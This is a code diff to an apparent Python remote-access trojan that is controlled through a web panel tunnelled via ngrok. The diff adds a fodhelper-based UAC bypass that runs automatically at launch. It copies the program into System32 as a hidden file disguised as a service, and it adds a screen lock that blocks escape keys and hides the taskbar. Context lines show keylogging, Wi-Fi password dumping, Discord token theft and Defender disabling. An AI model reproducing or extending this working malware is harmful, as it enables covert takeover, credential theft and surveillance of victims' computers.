@@ -60,7 +60,6 @@ from comtypes import CLSCTX_ALL
 from ctypes import cast, POINTER
 import pythoncom
 import sys, pathlib; sys.path.insert(0, str(pathlib.Path(f"{os.getcwd()}\\winpwnage").resolve()))
-from uacMethod2 import *
 disable_warnings_urllib3()
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -290,7 +289,43 @@ def stop_services():
         ngrok_process = None
     
     ngrok_url = None
-
+def get_reg_cmd():
+    return f'"{sys.executable}" "{sys.argv[0]}"'
+def set_reg(key_path, value_name, data):
+    try:
+        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+        winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, data)
+        winreg.CloseKey(key)
+        return True
+    except:
+        return False
+def delete_reg(key_path, value_name):
+    try:
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_ALL_ACCESS)
+        winreg.DeleteValue(key, value_name)
+        winreg.CloseKey(key)
+        return True
+    except:
+        return False
+def is_admin():
+    try:
+        return os.getuid() == 0
+    except:
+        import ctypes
+        return ctypes.windll.shell32.IsUserAnAdmin()
+def bypass():
+    if not is_admin():
+        reg_path = r"Software\Classes\ms-settings\shell\open\command"
+        set_reg(reg_path, "DelegateExecute", "")
+        set_reg(reg_path, None, get_reg_cmd())
+        startupinfo = subprocess.STARTUPINFO()
+        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+        startupinfo.wShowWindow = 0
+        subprocess.Popen("fodhelper.exe", startupinfo=startupinfo, shell=True)
+        time.sleep(2)
+        delete_reg(reg_path, "DelegateExecute")
+        delete_reg(reg_path, None)
+        sys.exit(0)
 def get_start_menu_paths():
     paths = []
     user_start = Path(os.environ.get('APPDATA')) / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs'
@@ -395,26 +430,12 @@ def hide_process():
     except Exception as e:
         logger.error(f"Error hiding process: {e}")
         return False
-def create_reg_key(key, value):
-    '''
-    Creates a reg key
-    '''
-    try:        
-        winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
-        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)                
-        winreg.SetValueEx(registry_key, key, 0, winreg.REG_SZ, value)        
-        winreg.CloseKey(registry_key)
-    except WindowsError:        
-        raise
-def bypass_uac(cmd):
-    '''
-    Tries to bypass the UAC
-    '''
-    try:
-        create_reg_key(DELEGATE_EXEC_REG_KEY, '')
-        create_reg_key(None, cmd)    
-    except WindowsError:
-        raise
+def add_to_sys32():
+    current_file = sys.argv[0]
+    target_path = os.path.join("C:\\Windows\\System32", "mspcsvc.exe")
+    if not os.path.exists(target_path):
+        shutil.copy2(current_file, target_path)
+        subprocess.run(f'attrib +h +s "{target_path}"', shell=True)
 def add_to_startup():
     try:
         startup_paths = [
@@ -430,7 +451,14 @@ def add_to_startup():
                 if not os.path.exists(target_path):
                     shutil.copy2(current_file, target_path)
                     subprocess.run(f'attrib +h +s "{target_path}"', shell=True)
-
+        if is_admin():
+            add_to_sys32()
+        else:
+            success = bypass()
+            if success:
+                add_to_sys32()
+            else:
+                logger.error("Failed to gain admin privileges for system32 copy.")
         try:
             reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
             with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE) as key:
@@ -710,24 +738,48 @@ def play_video_fullscreen_blocking(video_path):
     import time
     import ctypes
     from ctypes import wintypes
+    import threading
     
     # Windows constants
     WH_KEYBOARD_LL = 13
     HC_ACTION = 0
     VK_F4 = 0x73
     VK_MENU = 0x12
+    VK_TAB = 0x09
+    VK_LWIN = 0x5B
+    VK_RWIN = 0x5C
+    VK_ESCAPE = 0x1B
     
     CMPFUNC = ctypes.CFUNCTYPE(ctypes.c_int, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM)
     alt_pressed = False
+    keep_running = True
     
     def ll_keyboard_hook(n_code, w_param, l_param):
         nonlocal alt_pressed
         if n_code == HC_ACTION:
             kb_struct = ctypes.cast(l_param, ctypes.POINTER(wintypes.KBDLLHOOKSTRUCT)).contents
-            if kb_struct.vkCode == VK_MENU:
+            vk_code = kb_struct.vkCode
+            
+            # Track ALT key state
+            if vk_code == VK_MENU:
                 alt_pressed = w_param == win32con.WM_KEYDOWN
-            if alt_pressed and kb_struct.vkCode == VK_F4:
+            
+            # Block ALT+F4
+            if alt_pressed and vk_code == VK_F4:
                 return 1
+            
+            # Block ALT+TAB
+            if alt_pressed and vk_code == VK_TAB:
+                return 1
+            
+            # Block Windows keys (Left and Right)
+            if vk_code == VK_LWIN or vk_code == VK_RWIN:
+                return 1
+            
+            # Block ESC key
+            if vk_code == VK_ESCAPE:
+                return 1
+            
         return ctypes.windll.user32.CallNextHookEx(None, n_code, w_param, l_param)
     
     def block_ctrl_c(e):
@@ -736,6 +788,99 @@ def play_video_fullscreen_blocking(video_path):
                 return False
         return True
     
+    def force_fullscreen_monitor():
+        """Continuously monitor and enforce fullscreen status"""
+        nonlocal keep_running
+        window_name = "___FULLSCREEN_VIDEO___"
+        
+        # Wait a bit before starting to monitor to let video start playing
+        time.sleep(1)
+        
+        import win32api
+        screen_width = win32api.GetSystemMetrics(0)
+        screen_height = win32api.GetSystemMetrics(1)
+        print(f"Screen resolution: {screen_width}x{screen_height}")
+        
+        # Store the initial/expected fullscreen dimensions
+        last_width = screen_width
+        last_height = screen_height
+        last_x = 0
+        last_y = 0
+        
+        while keep_running:
+            try:
+                hwnd = win32gui.FindWindow(None, window_name)
+                if hwnd:
+                    # Get current window rect
+                    try:
+                        rect = win32gui.GetWindowRect(hwnd)
+                        window_width = rect[2] - rect[0]
+                        window_height = rect[3] - rect[1]
+                        window_x = rect[0]
+                        window_y = rect[1]
+                        
+                        # Debug: print window status every iteration
+                        print(f"DEBUG: Window state: {window_width}x{window_height} at ({window_x},{window_y})")
+                        
+                        # Check if ANY dimension has changed from last known good state
+                        size_changed = (
+                            window_width != last_width or 
+                            window_height != last_height or
+                            window_x != last_x or
+                            window_y != last_y
+                        )
+                        
+                        if size_changed:
+                            print(f"⚠ Window size/position changed! Forcing back... ({window_width}x{window_height} at {window_x},{window_y})")
+                            print(f"   Expected: {last_width}x{last_height} at ({last_x},{last_y})")
+                            
+                            # Simple approach: Just resize the window, don't change styles
+                            try:
+                                # Just force the window size and position back
+                                # Use NOOWNERZORDER and NOACTIVATE to minimize interference
+                                win32gui.SetWindowPos(
+                                    hwnd, 
+                                    win32con.HWND_TOPMOST,
+                                    0, 0,
+                                    screen_width,
+                                    screen_height,
+                                    win32con.SWP_SHOWWINDOW | win32con.SWP_NOOWNERZORDER | win32con.SWP_NOACTIVATE
+                                )
+                                
+                                # Try to maximize it
+                                win32gui.ShowWindow(hwnd, win32con.SW_MAXIMIZE)
+                                
+                                print("✓ Window repositioned")
+                            except Exception as e:
+                                print(f"Error repositioning: {e}")
+                            
+                            # Reset the expected dimensions back to fullscreen
+                            last_width = screen_width
+                            last_height = screen_height
+                            last_x = 0
+                            last_y = 0
+                            
+                            print("✓ Window forced back to fullscreen")
+                    except Exception as e:
+                        print(f"Error checking window state: {e}")
+                        import traceback
+                        traceback.print_exc()
+                
+                # Hide taskbar
+                taskbar = win32gui.FindWindow("Shell_TrayWnd", None)
+                if taskbar:
+                    win32gui.ShowWindow(taskbar, win32con.SW_HIDE)
+                
+                # Hide cursor
+                ctypes.windll.user32.ShowCursor(False)
+                    
+                time.sleep(0.15)  # Check every 150ms
+            except Exception as e:
+                print(f"Monitor error: {e}")
+                import traceback
+                traceback.print_exc()
+                time.sleep(0.15)
+    
     # Initialize variables
     temp_audio = None
     video = None
@@ -743,6 +888,7 @@ def play_video_fullscreen_blocking(video_path):
     keyboard_hook = None
     has_audio = False
     hwnd = None
+    monitor_thread = None
     
     try:
         if not os.path.exists(video_path):
@@ -759,7 +905,19 @@ def play_video_fullscreen_blocking(video_path):
         
         time.sleep(0.5)
         
+        # Hide taskbar immediately
+        try:
+            taskbar = win32gui.FindWindow("Shell_TrayWnd", None)
+            if taskbar:
+                win32gui.ShowWindow(taskbar, win32con.SW_HIDE)
+        except:
+            pass
+        
+        # Hide cursor immediately
+        ctypes.windll.user32.ShowCursor(False)
+        
         # Load video
+        from moviepy import VideoFileClip
         video = VideoFileClip(video_path)
         has_audio = video.audio is not None
         video_duration = video.duration
@@ -768,8 +926,7 @@ def play_video_fullscreen_blocking(video_path):
         # Extract audio with WAV format
         if has_audio:
             try:
-                temp_dir = tempfile.gettempdir()
-                temp_audio = os.path.join(temp_dir, f"temp_audio_{int(time.time())}.wav")
+                temp_audio = os.path.join(os.getenv('TEMP'), f"temp_audio_{int(time.time())}.wav")
                 
                 print("Extracting audio as WAV...")
                 video.audio.write_audiofile(temp_audio, codec='pcm_s16le', logger=None)
@@ -787,6 +944,14 @@ def play_video_fullscreen_blocking(video_path):
                 traceback.print_exc()
                 has_audio = False
                 temp_audio = None
+        
+        # Close video file after extracting audio to free resources
+        if video:
+            try:
+                video.close()
+                video = None
+            except:
+                pass
         
         # Initialize pygame mixer ONLY if we have audio
         if has_audio and temp_audio:
@@ -819,16 +984,7 @@ def play_video_fullscreen_blocking(video_path):
         )
         keyboard.hook(block_ctrl_c)
         
-        # Create window
-        cv2.namedWindow("___FULLSCREEN_VIDEO___", cv2.WND_PROP_FULLSCREEN)
-        cv2.setWindowProperty("___FULLSCREEN_VIDEO___", cv2.WND_PROP_FULLSCREEN, cv2.WINDOW_FULLSCREEN)
-        
-        hwnd = win32gui.FindWindow(None, "___FULLSCREEN_VIDEO___")
-        if hwnd:
-            win32gui.SetWindowPos(hwnd, win32con.HWND_TOPMOST, 0, 0, 0, 0,
-                                win32con.SWP_NOMOVE | win32con.SWP_NOSIZE)
-        
-        # Start video capture
+        # Start video capture BEFORE creating window to avoid freeze
         cap = cv2.VideoCapture(video_path)
         if not cap.isOpened():
             raise FileNotFoundError(f"Cannot open video: {video_path}")
@@ -842,20 +998,49 @@ def play_video_fullscreen_blocking(video_path):
         
         print(f"Video FPS: {fps}, delay: {delay}ms, total frames: {total_frames}")
         
+        # Create window with special flags
+        cv2.namedWindow("___FULLSCREEN_VIDEO___", cv2.WINDOW_NORMAL | cv2.WND_PROP_FULLSCREEN)
+        cv2.setWindowProperty("___FULLSCREEN_VIDEO___", cv2.WND_PROP_FULLSCREEN, cv2.WINDOW_FULLSCREEN)
+        
+        # Start the fullscreen monitoring thread
+        monitor_thread = threading.Thread(target=force_fullscreen_monitor, daemon=True)
+        monitor_thread.start()
+        
+        # Give the monitor thread time to set up but don't let it interfere yet
+        time.sleep(0.3)
+        
+        # Get screen dimensions before loop
+        import pyautogui
+        screen_width, screen_height = pyautogui.size()
+        
+        hwnd = win32gui.FindWindow(None, "___FULLSCREEN_VIDEO___")
+        if hwnd:
+            # Initial fullscreen setup
+            import win32api
+            win32gui.SetWindowPos(
+                hwnd, 
+                win32con.HWND_TOPMOST,
+                0, 0,
+                win32api.GetSystemMetrics(0),
+                win32api.GetSystemMetrics(1),
+                win32con.SWP_SHOWWINDOW
+            )
+        
         # Playback loop with sync
         frame_count = 0
         playback_start_time = time.time()
         audio_started = False
-        sync_check_interval = 30  # Check sync every 30 frames
-        max_desync_threshold = 0.1  # 100ms desync threshold
+        sync_check_interval = 30
+        max_desync_threshold = 0.1
         
         print("Starting playback...")
         
-        while cap.isOpened():
+        while cap.isOpened() and keep_running:
             loop_start = time.time()
             
             ret, frame = cap.read()
             if not ret:
+                # Video ended, break out of loop
                 break
             
             # Calculate current video position based on frame count
@@ -870,36 +1055,27 @@ def play_video_fullscreen_blocking(video_path):
             
             # Periodic sync check
             if has_audio and audio_started and frame_count % sync_check_interval == 0 and frame_count > 0:
-                # Calculate actual elapsed time
                 actual_elapsed = time.time() - playback_start_time
-                
-                # Calculate audio position (pygame doesn't provide direct position, so we estimate)
                 audio_position = actual_elapsed
-                
-                # Calculate desync
                 desync = abs(video_position - audio_position)
                 
                 if desync > max_desync_threshold:
                     print(f"⚠ Desync detected: {desync:.3f}s at frame {frame_count}")
-                    # Restart audio at correct position
                     try:
                         pygame.mixer.music.stop()
                         pygame.mixer.music.play(start=video_position)
                         print(f"✓ Audio resynced to {video_position:.2f}s")
                     except:
-                        # If start parameter doesn't work, just restart
                         pygame.mixer.music.play()
             
-            # Display frame
-            screen_width, screen_height = pyautogui.size()
-            frame = cv2.resize(frame, (screen_width, screen_height))
-            cv2.imshow("___FULLSCREEN_VIDEO___", frame)
+            # Resize frame once per loop
+            frame_resized = cv2.resize(frame, (screen_width, screen_height))
             
-            if hwnd and frame_count % 30 == 0:
-                try:
-                    win32gui.SetForegroundWindow(hwnd)
-                except:
-                    pass
+            # Display frame - no pausing needed now
+            cv2.imshow("___FULLSCREEN_VIDEO___", frame_resized)
+            
+            # CRITICAL: Process window events with proper timing
+            cv2.waitKey(1)
             
             # Audio status check
             if has_audio and audio_started and frame_count % 50 == 0:
@@ -910,17 +1086,14 @@ def play_video_fullscreen_blocking(video_path):
                     except:
                         pygame.mixer.music.play()
             
-            # Handle timing to maintain frame rate
-            if cv2.waitKey(1) & 0xFF == 27:
-                continue
-            
             frame_count += 1
             
             # Precise frame timing
-            loop_elapsed = (time.time() - loop_start) * 1000  # Convert to ms
-            sleep_time = max(1, delay - int(loop_elapsed))
-            if sleep_time > 1:
-                time.sleep(sleep_time / 1000.0)
+            loop_elapsed = (time.time() - loop_start)
+            target_time = 1.0 / fps
+            sleep_time = target_time - loop_elapsed
+            if sleep_time > 0:
+                time.sleep(sleep_time)
         
         elapsed = time.time() - playback_start_time
         print(f"Finished: {frame_count} frames in {elapsed:.2f}s")
@@ -935,6 +1108,11 @@ def play_video_fullscreen_blocking(video_path):
         
     finally:
         print("Cleanup...")
+        
+        # Stop monitoring thread
+        keep_running = False
+        if monitor_thread:
+            monitor_thread.join(timeout=1)
         
         # Stop audio
         try:
@@ -985,6 +1163,14 @@ def play_video_fullscreen_blocking(video_path):
         
         try:
             keyboard.unhook_all()
+        except:
+            pass
+        
+        # Restore taskbar
+        try:
+            taskbar = win32gui.FindWindow("Shell_TrayWnd", None)
+            if taskbar:
+                win32gui.ShowWindow(taskbar, win32con.SW_SHOW)
         except:
             pass
         
@@ -1261,6 +1447,10 @@ HTML_INTERFACE = """
                         <button class="btn" onclick="captureScreen()">📸 Capture Screenshot</button>
                         <button class="btn" onclick="executeCommand('webcam')">📷 Webcam Photo</button>
                         <button class="btn" onclick="getClipboard()">📋 Get Clipboard</button>
+                        <div class="input-group">
+                            <input type="text" id="clipboard-text" placeholder="Text to copy to clipboard...">
+                            <button class="btn" onclick="setClipboard()">📝 Set Clipboard</button>
+                        </div>
                         <button class="btn" onclick="showMessage()">💬 Show Message Box</button>
                         <div class="input-group">
                             <input type="text" id="message-text" placeholder="Message text...">
@@ -1336,6 +1526,7 @@ HTML_INTERFACE = """
                 <div class="control-grid">
                     <div class="control-card">
                         <h3>🖥️ System Information</h3>
+                        <button class="btn" onclick="executeCommand('checkifadmin')">🔒 Check Admin Privileges</button>
                         <button class="btn" onclick="executeCommand('systeminfo')">💻 System Info</button>
                         <button class="btn" onclick="executeCommand('cpu')">🚀 CPU Info</button>
                         <button class="btn" onclick="executeCommand('gpu')">🎮 GPU Info</button>
@@ -1480,6 +1671,34 @@ HTML_INTERFACE = """
         } catch (error) {
             document.getElementById('command-result').textContent = `Error: ${error}`;
             showNotification('Network error occurred', 'error');
+        }
+    }
+    async function setClipboard() {
+        const text = document.getElementById('clipboard-text').value;
+        if (text) {
+            try {
+                const response = await fetch('/api/set_clipboard', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ text: text })
+                });
+                
+                const result = await response.json();
+                document.getElementById('command-result').textContent = result.result || result.error;
+                if (result.success) {
+                    showNotification('Clipboard set successfully!');
+                    document.getElementById('clipboard-text').value = '';
+                } else {
+                    showNotification('Error setting clipboard', 'error');
+                }
+            } catch (error) {
+                document.getElementById('command-result').textContent = `Error: ${error}`;
+                showNotification('Network error occurred', 'error');
+            }
+        } else {
+            showNotification('Please enter text to copy', 'error');
         }
     }
     async function uploadFile() {
@@ -1685,7 +1904,7 @@ HTML_INTERFACE = """
             try {
                 result = JSON.parse(text);
             } catch {
-                document.getElementById('file-result').textContent = "Non-JSON response:\n" + text;
+                document.getElementById('file-result').textContent = "Non-JSON response:" + text;
                 return;
             }
             document.getElementById('file-result').textContent = result.files || result.error;
@@ -1892,19 +2111,19 @@ def api_command():
                     # Instead of sending the file, return a JSON with the image URL
                     return jsonify({'success': True, 'image_url': '/api/webcam_image'})
                 else:
-                    return jsonify({'success': False, 'error': 'Failed to capture webcam image'})
+                    return jsonify({'success': False, 'error': f'Failed to capture webcam image\n{watermark()}'})
             except:
-                return jsonify({'success': False, 'error': 'Webcam not available'})
+                return jsonify({'success': False, 'error': f'Webcam not available\n{watermark()}'})
         
         elif command == 'ip':
             hostname = socket.gethostname()
             ip_address = socket.gethostbyname(hostname)
-            return jsonify({'success': True, 'result': f'IP: {ip_address}'})
+            return jsonify({'success': True, 'result': f'IP: {ip_address}\n{watermark()}'})
         
         elif command == 'wifi':
             result = subprocess.check_output("netsh wlan show interfaces", shell=True, text=True)
-            return jsonify({'success': True, 'result': result})
-        
+            return jsonify({'success': True, 'result': f'{result}\n{watermark()}'})
+
         elif command == 'wifi_passwords':
             profiles = subprocess.check_output("netsh wlan show profiles", shell=True, text=True)
             profile_names = [
@@ -1932,22 +2151,22 @@ def api_command():
                         passwords.append(f"{name}: <No password>")
                 except:
                     passwords.append(f"{name}: <Error>")
-            return jsonify({'success': True, 'result': '\n'.join(passwords)})
+            return jsonify({'success': True, 'result': f'\n'.join(passwords)})
         
         elif command == 'url':
             if parameters:
                 url = "http://" + parameters if not parameters.startswith(("http://", "https://")) else parameters
                 webbrowser.open(url)
-                return jsonify({'success': True, 'result': f'Opened URL: {url}'})
+                return jsonify({'success': True, 'result': f'Opened URL: {url}\n{watermark()}'})
         elif command == 'log':
             log_active = True
             keyboard.hook(on_key_event)
-            return jsonify({'success': True, 'result': 'Keylogging started'})
-        
+            return jsonify({'success': True, 'result': f'Keylogging started\n{watermark()}'})
+
         elif command == 'stoplog':
             log_active = False
-            return jsonify({'success': True, 'result': 'Keylogging stopped'})
-        
+            return jsonify({'success': True, 'result': f'Keylogging stopped\n{watermark()}'})
+
         elif command == 'avbypass':
             defender_disabled = disable_defender()
             exclusion_added = add_exclusion(sys.argv[0])
@@ -1969,11 +2188,10 @@ Startup Persistence: {'✅' if startup_added else '❌'}"""
         elif command == 'su':
             try:
                 if ctypes.windll.shell32.IsUserAnAdmin():
-                    return jsonify({'success': True, 'result': 'Already running as administrator'})
-                uacMethod2(["c:\\windows\\system32\\cmd.exe ", "/k", f"python {__file__}"])
-                return jsonify({'success': True, 'result': 'Admin privileges requested'})
+                    return jsonify({'success': True, 'result': f'Already running as administrator\n{watermark()}'})
+                return jsonify({'success': True, 'result': f'Admin privileges requested\n{watermark()}'})
             except Exception as e:
-                return jsonify({'success': False, 'error': f'Failed to elevate: {e}'})
+                return jsonify({'success': False, 'error': f'Failed to elevate: {e}\n{watermark()}'})
         
         elif command == 'discord':
             tokens = DiscordTokenStealer.get_tokens()
@@ -1983,7 +2201,7 @@ Startup Persistence: {'✅' if startup_added else '❌'}"""
                     token_list.append(f"{i}. {token_info['platform']}: {token_info['token']}")
                 return jsonify({'success': True, 'result': '\n'.join(token_list)})
             else:
-                return jsonify({'success': False, 'error': 'No Discord tokens found'})
+                return jsonify({'success': False, 'error': 'No Discord tokens found\n{watermark()}'})
         
         elif command == 'open':
             if parameters:
@@ -2082,7 +2300,12 @@ Startup Persistence: {'✅' if startup_added else '❌'}"""
         elif command == 'user':
             result = os.getlogin()
             return jsonify({'success': True, 'result': result})
-        
+        elif command == 'checkifadmin':
+            try:
+                running_as_admin = is_admin()
+                return jsonify({'success': running_as_admin, 'result': f'Running as admin: {True if running_as_admin else False}'})
+            except:
+                return jsonify({'success': False, 'result': 'Failed to check admin privileges'})
         elif command == 'recent':
             browser = parameters.lower() if parameters else "chrome"
             history = []
@@ -2090,7 +2313,6 @@ Startup Persistence: {'✅' if startup_added else '❌'}"""
                 browser_paths = {
                     "chrome": os.path.join(getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
                     "edge": os.path.join(getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
-
                     "brave": os.path.join(getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
                 }
                 path = browser_paths.get(browser)
@@ -2148,8 +2370,18 @@ Startup Persistence: {'✅' if startup_added else '❌'}"""
                             os.remove(temp_db)
                         except Exception:
                             continue
-            if (history.length > 0):
-                return jsonify({'success': True, 'result': history.slice(0, 50)})
+            
+            # Fixed: Return proper JSON response
+            if len(history) > 0:
+                # Format history as readable text for display
+                formatted_history = []
+                for i, entry in enumerate(history[:50], 1):
+                    formatted_history.append(f"{i}. [{entry['browser']}] {entry['title']}\n   {entry['url']}\n   {entry['timestamp']}\n")
+                
+                return jsonify({
+                    'success': True, 
+                    'result': '\n'.join(formatted_history)
+                })
             else:
                 return jsonify({'success': False, 'error': 'No history found'})
         
@@ -2157,6 +2389,21 @@ Startup Persistence: {'✅' if startup_added else '❌'}"""
             return jsonify({'success': False, 'error': f'Unknown command: {command}'})
         
     
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+@app.route('/api/set_clipboard', methods=['POST'])
+def api_set_clipboard():
+    try:
+        data = request.get_json()
+        if not data:
+            return jsonify({'success': False, 'error': 'No JSON data received'})
+            
+        text = data.get('text', '')
+        if text:
+            pyperclip.copy(text)
+            return jsonify({'success': True, 'result': f'Clipboard set to: {text[:50]}{"..." if len(text) > 50 else ""}'})
+        else:
+            return jsonify({'success': False, 'error': 'No text provided'})
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
 
@@ -2560,16 +2807,13 @@ def api_unmute_volume():
         pythoncom.CoUninitialize()
 if __name__ == "__main__":
     try:
-        # Load saved config if exists
-        load_config()
-        if __name__ == "__main__":
             try:
                 # Load saved config if exists
                 load_config()
                 
                 # Download ngrok
                 ngrok_path = download_ngrok()
-                
+                bypass()
                 # Set up and start ngrok tunnel
                 ngrok_url = start_ngrok(ngrok_path)
                 if not ngrok_url:
